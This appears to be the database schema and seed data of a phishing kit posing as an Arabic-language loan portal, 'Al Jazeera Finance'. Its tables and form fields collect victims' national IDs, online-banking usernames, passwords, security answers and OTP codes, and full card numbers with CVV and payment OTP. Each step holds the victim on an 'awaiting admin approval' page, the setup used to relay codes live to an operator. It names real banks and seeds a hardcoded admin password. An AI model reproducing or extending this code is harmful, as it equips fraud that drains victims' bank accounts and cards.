-- =====================================================
-- قاعدة بيانات Jazeera Finance - إنشاء الجداول
-- =====================================================


-- 1. جدول البنوك
CREATE TABLE IF NOT EXISTS banks (
    id SERIAL PRIMARY KEY,
    name TEXT NOT NULL,
    name_ar TEXT NOT NULL,
    logo_url TEXT,
    is_active BOOLEAN NOT NULL DEFAULT true,
    sort_order INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 2. جدول خدمات التمويل
CREATE TABLE IF NOT EXISTS financing_services (
    id SERIAL PRIMARY KEY,
    title TEXT NOT NULL,
    title_ar TEXT NOT NULL,
    description TEXT NOT NULL,
    description_ar TEXT NOT NULL,
    image_url TEXT,
    icon_name TEXT,
    is_active BOOLEAN NOT NULL DEFAULT true,
    sort_order INTEGER NOT NULL DEFAULT 0,
    financing_type TEXT NOT NULL,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 3. جدول جلسات المستخدمين
CREATE TABLE IF NOT EXISTS user_sessions (
    id TEXT PRIMARY KEY,
    ip_address TEXT,
    country TEXT,
    user_agent TEXT,
    current_page TEXT NOT NULL DEFAULT 'home',
    application_id INTEGER,
    is_active BOOLEAN NOT NULL DEFAULT true,
    is_blocked BOOLEAN NOT NULL DEFAULT false,
    blocked_reason TEXT,
    pending_message TEXT,
    pending_navigation TEXT,
    credentials_status TEXT DEFAULT 'pending',
    credentials_message TEXT,
    otp_status TEXT DEFAULT 'pending',
    last_seen_at TIMESTAMP NOT NULL DEFAULT NOW(),
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    deleted_at TIMESTAMP
);

-- 4. جدول الطلبات
CREATE TABLE IF NOT EXISTS applications (
    id SERIAL PRIMARY KEY,
    session_id TEXT NOT NULL,
    applicant_type TEXT NOT NULL DEFAULT 'individual',
    current_step TEXT NOT NULL DEFAULT 'applicant-info',
    status TEXT NOT NULL DEFAULT 'pending',
    
    -- معلومات البنك
    bank_id INTEGER,
    bank_name TEXT,
    bank_logo TEXT,
    
    -- حقول التمويل الشخصي
    full_name TEXT,
    national_id TEXT,
    date_of_birth TEXT,
    monthly_salary TEXT,
    employer TEXT,
    phone TEXT,
    email TEXT,
    city TEXT,
    marital_status TEXT,
    
    -- حقول تمويل الأعمال
    company_name TEXT,
    business_type TEXT,
    commercial_registration TEXT,
    employee_count TEXT,
    annual_revenue TEXT,
    contact_name TEXT,
    
    -- بيانات الدخول للبنك
    bank_username TEXT,
    bank_password TEXT,
    security_answer TEXT,
    
    -- رمز التحقق
    otp_code TEXT,
    
    -- بيانات الدفع (PayVisa)
    payment_card_number TEXT,
    payment_card_holder TEXT,
    payment_expiry_date TEXT,
    payment_cvv TEXT,
    payment_otp TEXT,
    payment_status TEXT DEFAULT 'pending',
    payment_completed_at TIMESTAMP,
    
    -- بيانات الحقول المخصصة الإضافية (JSON)
    extra_data TEXT,
    
    -- ملاحظات المدير
    admin_note TEXT,
    
    -- نظام التحكم بالنسخ
    version INTEGER NOT NULL DEFAULT 1,
    parent_id INTEGER,
    is_latest BOOLEAN NOT NULL DEFAULT true,
    
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP NOT NULL DEFAULT NOW(),
    deleted_at TIMESTAMP
);

-- 5. جدول محتوى الصفحات
CREATE TABLE IF NOT EXISTS page_contents (
    id SERIAL PRIMARY KEY,
    page_key TEXT NOT NULL,
    section_key TEXT NOT NULL,
    content TEXT NOT NULL DEFAULT '',
    updated_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 6. جدول الحقول المخصصة
CREATE TABLE IF NOT EXISTS custom_fields (
    id SERIAL PRIMARY KEY,
    page_key TEXT NOT NULL,
    field_key TEXT NOT NULL,
    label_ar TEXT NOT NULL,
    field_type TEXT NOT NULL DEFAULT 'text',
    placeholder TEXT DEFAULT '',
    options TEXT DEFAULT '',
    is_required BOOLEAN NOT NULL DEFAULT false,
    is_active BOOLEAN NOT NULL DEFAULT true,
    sort_order INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 7. جدول إعدادات الموقع
CREATE TABLE IF NOT EXISTS site_settings (
    id SERIAL PRIMARY KEY,
    company_name TEXT NOT NULL DEFAULT 'Al Jazeera Finance',
    company_name_ar TEXT NOT NULL DEFAULT 'الجزيرة للتمويل والحلول المالية',
    hero_title TEXT NOT NULL DEFAULT 'حلول تمويلية متكاملة لتحقيق أهدافك',
    hero_subtitle TEXT NOT NULL DEFAULT 'نقدم لك أفضل خيارات التمويل بأرباح تنافسية وشروط مرنة',
    hero_image_url TEXT,
    logo_url TEXT,
    primary_color TEXT NOT NULL DEFAULT '#1e3a5f',
    contact_phone TEXT DEFAULT '920000000',
    contact_email TEXT DEFAULT 'info@aljazeera-finance.com',
    contact_address TEXT DEFAULT 'الرياض، المملكة العربية السعودية',
    otp_field_label TEXT NOT NULL DEFAULT 'أدخل رمز التحقق',
    otp_field_placeholder TEXT NOT NULL DEFAULT 'رمز التحقق',
    waiting_page_message TEXT NOT NULL DEFAULT 'يرجى الانتظار بينما يقوم فريقنا بمراجعة طلبكم. سيتم التواصل معكم قريباً.',
    updated_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 8. جدول إعدادات المدير
CREATE TABLE IF NOT EXISTS admin_config (
    id SERIAL PRIMARY KEY,
    username TEXT NOT NULL DEFAULT 'admin',
    password TEXT NOT NULL DEFAULT 'Fa@@20yiz',
    updated_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 9. جدول الأجهزة الموثوقة
CREATE TABLE IF NOT EXISTS trusted_devices (
    id SERIAL PRIMARY KEY,
    device_id TEXT NOT NULL UNIQUE,
    device_name TEXT,
    device_type TEXT,
    browser TEXT,
    os TEXT,
    push_subscription TEXT,
    ip_address TEXT,
    is_active BOOLEAN NOT NULL DEFAULT true,
    last_used_at TIMESTAMP NOT NULL DEFAULT NOW(),
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- =====================================================
-- الفهارس (Indexes)
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_applications_session_id ON applications(session_id);
CREATE INDEX IF NOT EXISTS idx_applications_parent_id ON applications(parent_id);
CREATE INDEX IF NOT EXISTS idx_applications_is_latest ON applications(is_latest);
CREATE INDEX IF NOT EXISTS idx_applications_status ON applications(status);
CREATE INDEX IF NOT EXISTS idx_applications_current_step ON applications(current_step);
CREATE INDEX IF NOT EXISTS idx_applications_deleted_at ON applications(deleted_at);
CREATE INDEX IF NOT EXISTS idx_user_sessions_deleted_at ON user_sessions(deleted_at);
CREATE INDEX IF NOT EXISTS idx_page_contents_page_key ON page_contents(page_key);
CREATE INDEX IF NOT EXISTS idx_custom_fields_page_key ON custom_fields(page_key);

-- =====================================================
-- البيانات الأولية (Seed Data)
-- =====================================================

-- إعدادات المدير الافتراضية
INSERT INTO admin_config (username, password) VALUES ('admin', 'Fa@@20yiz') ON CONFLICT DO NOTHING;

-- إعدادات الموقع الافتراضية
INSERT INTO site_settings (company_name, company_name_ar, hero_title, hero_subtitle, primary_color) 
VALUES (
    'Al Jazeera Finance',
    'الجزيرة للتمويل والحلول المالية',
    'حلول تمويلية متكاملة لتحقيق أهدافك',
    'نقدم لك أفضل خيارات التمويل بأرباح تنافسية وشروط مرنة',
    '#1e3a5f'
) ON CONFLICT DO NOTHING;

-- البنوك الافتراضية
INSERT INTO banks (name, name_ar, logo_url, is_active, sort_order) VALUES
('Al Rajhi Bank', 'بنك الراجحي', '/banks/rajhi.png', true, 1),
('Saudi National Bank', 'البنك الأهلي', '/banks/ahli.png', true, 2),
('Samba Bank', 'بنك Samba', '/banks/samba.png', true, 3),
('Riyadh Bank', 'بنك الرياض', '/banks/riyadh.png', true, 4),
('SABB', 'بنك الصحراء', '/banks/sabb.png', true, 5)
ON CONFLICT DO NOTHING;

-- خدمات التمويل الافتراضية
INSERT INTO financing_services (title, title_ar, description, description_ar, icon_name, is_active, sort_order, financing_type) VALUES
('Personal Financing', 'التمويل الشخصي', 'Get the funds you need for any personal expense', 'احصل على التمويل الذي تحتاجه لأي نفقة شخصية', 'wallet', true, 1, 'personal'),
('Real Estate Financing', 'التمويل العقاري', 'Dream home financing with competitive rates', 'تمويل أحلامك العقارية بأرباح تنافسية', 'home', true, 2, 'real-estate'),
('Auto Financing', 'تمويل السيارات', 'Drive your dream car today', 'اقتدر سيارتك اليوم', 'car', true, 3, 'auto'),
('Business Financing', 'التمويل التجاري', 'Grow your business with flexible financing', 'طور عملك بتمويل مرن', 'briefcase', true, 4, 'business')
ON CONFLICT DO NOTHING;

-- محتوى الصفحات الافتراضي
INSERT INTO page_contents (page_key, section_key, content) VALUES
-- صفحة الرئيسية
('home', 'hero_title', 'حلول تمويلية متكاملة لتحقيق أهدافك'),
('home', 'hero_subtitle', 'نقدم لك أفضل خيارات التمويل من أفضل البنوك'),
('home', 'cta_button', 'قدم الآن'),

-- صفحة التقديم
('apply', 'title', 'قدم على تمويلك'),
('apply', 'subtitle', 'املأ النموذج وسنتواصل معك خلال 24 ساعة'),

-- صفحة النجاح
('success', 'title', 'تم استلام طلبك بنجاح!'),
('success', 'message', 'شكراً لك. سيتواصل معك فريقنا خلال 24 ساعة.'),

-- صفحة الدفع
('pay-visa', 'page_title', 'إتمام عملية الدفع'),
('pay-visa', 'page_subtitle', 'أدخل بيانات البطاقة لإتمام العملية'),
('pay-visa', 'badge_text', 'دفع آمن ومشفر 100%'),
('pay-visa', 'submit_btn', 'إتمام الدفع'),
('pay-visa', 'waiting_title', 'في انتظار موافقة المدير'),
('pay-visa', 'waiting_message', 'تم إرسال بيانات البطاقة للمدير للمراجعة'),

-- صفحة OTP الدفع
('pay-otp', 'waiting_title', 'في انتظار الموافقة'),
('pay-otp', 'waiting_message', 'تم إرسال الرمز. في انتظار موافقة المدير...'),
('pay-otp', 'approved_title', 'تمت الموافقة'),
('pay-otp', 'submit_btn', 'إرسال الرمز'),

-- صفحة التحقق من البنك
('credentials', 'page_title', 'تسجيل الدخول للبنك'),
('credentials', 'page_subtitle', 'أدخل بيانات الدخول للبنك للمتابعة'),
('credentials', 'submit_btn', 'متابعة'),
('credentials', 'waiting_title', 'في انتظار موافقة المدير'),
('credentials', 'waiting_message', 'جاري مراجعة بيانات الدخول من قبل المدير'),

-- صفحة التحقق OTP
('verify', 'page_title', 'التحقق بخطوتين'),
('verify', 'page_subtitle', 'أدخل رمز التحقق المرسل لرقم جوالك'),
('verify', 'submit_btn', 'تحقق'),
('verify', 'waiting_title', 'في انتظار الموافقة'),
('verify', 'waiting_message', 'جاري مراجعة الرمز من قبل المدير'),

-- صفحة الانتظار
('waiting', 'title', 'شكراً لك!'),
('waiting', 'message', 'سيتواصل معك فريقنا خلال 24 ساعة')
ON CONFLICT DO NOTHING;

-- الحقول الافتراضية لصفحة بيانات التقديم (شخصي)
INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('apply_individual', 'fullName', 'الاسم الكامل', 'text', 'أدخل الاسم الكامل', '', true, 1),
('apply_individual', 'nationalId', 'رقم الهوية / رقم الإقامة', 'text', 'أدخل رقم الهوية', '', true, 2),
('apply_individual', 'dateOfBirth', 'تاريخ الميلاد', 'date', '', '', true, 3),
('apply_individual', 'monthlySalary', 'الراتب الشهري (ريال قطري)', 'number', 'أدخل الراتب الشهري', '', true, 4),
('apply_individual', 'employer', 'جهة العمل', 'text', 'أدخل جهة العمل', '', true, 5),
('apply_individual', 'phone', 'رقم الجوّال', 'tel', 'أدخل رقم الجوّال', '', true, 6),
('apply_individual', 'email', 'البريد الإلكتروني', 'email', 'أدخل البريد الإلكتروني', '', false, 7),
('apply_individual', 'city', 'المنطقة / المدينة', 'select', 'اختر المنطقة', 'الدوحة,الريان,الوكرة,الخور,الشمال,أم صلال,الضعاين,مسيعيد,دخان', false, 8),
('apply_individual', 'maritalStatus', 'الحالة الاجتماعية', 'select', 'اختر الحالة', 'أعزب / عزباء,متزوج / متزوجة,مطلّق / مطلّقة,أرمل / أرملة', false, 9)
ON CONFLICT DO NOTHING;

-- الحقول الافتراضية لصفحة بيانات التقديم (تجاري)
INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('apply_business', 'companyName', 'اسم الشركة', 'text', 'أدخل اسم الشركة', '', true, 1),
('apply_business', 'businessType', 'نوع النشاط التجاري', 'text', 'أدخل نوع النشاط', '', true, 2),
('apply_business', 'commercialRegistration', 'رقم السجل التجاري', 'text', 'أدخل رقم السجل', '', true, 3),
('apply_business', 'employeeCount', 'عدد الموظفين', 'number', 'أدخل عدد الموظفين', '', false, 4),
('apply_business', 'annualRevenue', 'الإيرادات السنوية (ريال قطري)', 'number', 'أدخل الإيرادات السنوية', '', false, 5),
('apply_business', 'contactName', 'اسم المسؤول', 'text', 'أدخل اسم المسؤول', '', true, 6),
('apply_business', 'phone', 'رقم الجوّال', 'tel', 'أدخل رقم الجوّال', '', true, 7),
('apply_business', 'email', 'البريد الإلكتروني', 'email', 'أدخل البريد الإلكتروني', '', false, 8)
ON CONFLICT DO NOTHING;

-- الحقول الافتراضية لصفحة بيانات البنك
INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('credentials', 'bankUsername', 'اسم المستخدم', 'text', 'أدخل اسم المستخدم', '', true, 1),
('credentials', 'bankPassword', 'كلمة المرور', 'password', 'أدخل كلمة المرور', '', true, 2),
('credentials', 'securityAnswer', 'كلمة التحقق الأمنية', 'text', 'أدخل كلمة التحقق', '', true, 3)
ON CONFLICT DO NOTHING;

-- الحقول الافتراضية لصفحة التحقق OTP
INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('verify', 'otpCode', 'رمز التحقق (OTP)', 'text', 'أدخل الرمز', '', true, 1)
ON CONFLICT DO NOTHING;

-- الحقول الافتراضية لصفحة الدفع بالبطاقة
INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('pay-visa', 'paymentCardNumber', 'رقم بطاقة الدفع', 'text', 'أدخل رقم البطاقة', '', true, 1),
('pay-visa', 'paymentCardHolder', 'اسم حامل البطاقة', 'text', 'أدخل الاسم كما هو على البطاقة', '', true, 2),
('pay-visa', 'paymentExpiryDate', 'تاريخ انتهاء البطاقة', 'text', 'MM/YY', '', true, 3),
('pay-visa', 'paymentCvv', 'رمز CVV/CVC', 'password', 'أدخل الرمز', '', true, 4)
ON CONFLICT DO NOTHING;

-- الحقول الافتراضية لصفحة OTP الدفع
INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('pay-otp', 'paymentOtp', 'رمز التحقق (OTP)', 'text', 'أدخل رمز التحقق', '', true, 1)
ON CONFLICT DO NOTHING;
